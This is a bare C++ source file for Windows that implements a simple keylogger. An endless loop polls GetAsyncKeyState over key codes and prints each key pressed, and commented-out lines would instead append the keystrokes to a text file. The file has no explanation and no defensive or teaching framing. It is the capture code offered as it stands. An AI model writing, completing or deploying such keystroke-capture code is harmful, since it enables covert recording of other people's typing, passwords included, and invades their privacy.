#include <windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

main()
{
    while (1)
    {
        unsigned short ch, i;
        ch = 1;
        while (ch < 250)
        {
            for (i = 0; i < 50; i++, ch++)
            {
                if (GetAsyncKeyState(ch) == -32767)
                {
                    // std::ofstream outfile;
                    //
                    // outfile.open("yourfile.txt", std::ios_base::app);
                    // outfile << char(ch);
                    std::cout << char(ch);
                }
            }
        }
    }
}